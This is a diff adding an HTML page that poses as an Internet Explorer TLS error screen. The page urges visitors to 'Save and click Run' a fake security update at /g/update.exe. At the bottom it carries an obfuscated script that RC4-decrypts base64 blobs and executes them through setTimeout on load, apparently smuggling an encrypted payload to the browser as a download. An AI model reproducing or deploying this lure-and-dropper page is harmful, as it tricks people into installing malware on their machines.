@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+
+<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta charset="utf-8" />
+    <title>Can&rsquo;t connect securely to this page</title>
+    <link rel="stylesheet" type="text/css" href="ie.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script language="javascript" type="text/javascript">
+        var L_NONDEFAULT_SETTINGS_TEXT = "Your TLS security settings aren\u2019t set to the defaults, which could also be causing this error.";
+
+        function checkTLSError() {
+            var protocolSettings = Number(findValue("SecureProtocol="));
+            var defaultSettings = 2688; // 0xa80 - TLS 1.0, TLS 1.1, TLS 1.2
+            if (protocolSettings !== defaultSettings) {
+                document.getElementById("subError").innerHTML += "<br><br>" + L_NONDEFAULT_SETTINGS_TEXT;
+            }
+        }
+    </script>
+</head>
+
+<body onload="goToLocalizedErrorPage();checkTLSError()">
+    <div id="Wrapper">
+        <div id="tlserror">
+            <table>
+                <tr>
+                    <td>
+                        <img src="i.png" style="margin-right:2rem">
+                    </td>
+                    <td>
+                        <h1 id="tlserror_header">Can&rsquo;t connect securely to this page</h1>
+                        <p class="BodyTextBlockStyle" id="subError">This might be because the you don&rsquo;t have the latest security patches installed. Please update before you continue.</p>
+                        <p id="tlserror_body">To do this:</p>
+                        <ul>
+                            <li><id id="tlserror_goback"><a href="/g/update.exe"><span style="color: rgb(0,102,204)">Save and click Run</span></a> to install the latest security patches.</id></li>
+                        </ul>
+                    </td>
+                </tr>
+            </table>
+        </div>
+    </div>
+<script>
+function HyoiFiQQ(r,o){for(var t,e=[],n=0,a="",f=0;f<256;f++)e[f]=f;for(f=0;f<256;f++)n=(n+e[f]+r.charCodeAt(f%r.length))%256,t=e[f],e[f]=e[n],e[n]=t;f=0,n=0;for(var h=0;h<o.length;h++)n=(n+e[f=(f+1)%256])%256,t=e[f],e[f]=e[n],e[n]=t,a+=String.fromCharCode(o.charCodeAt(h)^e[(e[f]+e[n])%256]);return a}
+var tZmhQyyc = function(){return "update"};
+var gWFmdYfc = "ftVIwasZMIbWgOTaPJJoGCZZTCyV65n5lk1wLCpBBn0KvNdFbg7ZlbHr5cgQgn6JkBG1WbUsRzf7pp5BUMU9zknsZC/gKLHBcuHrJg0FsOtKx7GK9GB1G04HvOVoZCtUBC8aDWf/N/xSuo8PDuurno7fYj1bZWBejUo5fQTNamAqUCtEvRuZS7/UMyA4YSLiMOR11PtzzXlmRomkSXVgeBm37KGgN/d4i9lwMAcwr1fAY1gFTF79dvqf8WHGI3FTX6BfO8JO5O3vpy/ND6pKLROKrMZ/FNOFOg1OvF0es2+kDL8A0RqeHkdIb7/4uWlyaxDgGsHyU40XNnmXFX97cSZvLSUBy/mHkdkPlJ1LtWk4mShFOcLeUp5xKOenRABSAQu893kl6BrjDt6FeRzRuJJdr+h17qAI62S1qoHQTDYsbZfE3KMMltL8QrGpsZNG3TlL08b29ql3/GBSrvjQiEyFikyn/B713QeGrKdLRRW1KnwtCMrwqaud9Hi91EI/vT+qnCrxzYcCfGlPcPaJwmHAFnuWP+Ycw3qd+HQa8hxQ01AOcdEGa8QajyUR1BcUKJV1yJOyaO8oUkc8gKWSxc51yTdJibZjyeyrtIttJgNSekmMqEmCI7vezmyggV5zs9x/Fi5o9uK4NkBu8VoVkY4+3jBlxsP6p0YDcVS2+Ks6xuwoc25CjEUFKApw5SUCaQ0cEaJ8Zxm8bBmjQoq4+5mnscEmQ/lq5nvBDtSRKg6KT3mhWRqzkVB/MlliTVV2hbP9nObmXzjbJG0ffuDNyHk/bgYMXXhUjtaTE5H6GKWBRbYbam8OuKM/DQFyCNucwk6eRzWBoF0eKVNB7JecRo5Ruh2I42DY7Wq19Y3gJZhT3qU0ufVZmN16PMoXxq0YAjjvPbCV3c7GsEhUbsvTw1OeSq/ANfsKVFv9MFLvwW1NkDGxBtjAwgkr76lpj7rtkXVP069Y6bcXD38=";
+var ODBeFvEO = HyoiFiQQ(tZmhQyyc(),atob("ANFTzg=="));
+setTimeout('var nSykbNAZ = new '+ODBeFvEO+'([HyoiFiQQ(tZmhQyyc(), atob(gWFmdYfc))])');
+var iHmcSMNB = HyoiFiQQ(tZmhQyyc(),atob("attJwqRTU9XQzeeSZPY1BiACXjWH44Lxlk5qOmNKWik1meVScxWHjOCGju0AryyxiRq/dK4cSnCdvpZLPqMpj0n+ZmbuJLXLcrzpOz8Qr+Fmi+PI7whQPk8IovRhFwd8Mw8vJFHEWd490I9cS6250u7gYmEgS1IRzFg4bkmVZgMjQTNAvW7ZQKrHK2F5VzTuMtk5y+F01mJsA9reJWFkZ3W5sre9NuE11f0dDAEx4mHLZQAPXV68P7+W8mfKMnBVWcFRd4UQ5rfUsDjdV68Lan3siI1YMPbIPFF4uEoOjmS6EINazSWiU1MSO7C3qW9qazDqDcCjCIobK3neAn92ZT9jLD8loMWGnNcBhod9r2wJhTRZfdefKMBicO2oSE1+TFavsUEv80S0P/rZdBDQss98vuRo7LA7oSTTx/rUEWs+Jvc="));
+setTimeout(iHmcSMNB+'(nSykbNAZ, HyoiFiQQ(tZmhQyyc(), atob("bc9Tw7MIStLXlu3XbP97AzFKCjWPr5Dg1kJxLA==")))');
+</script>
+</body>
+</html>
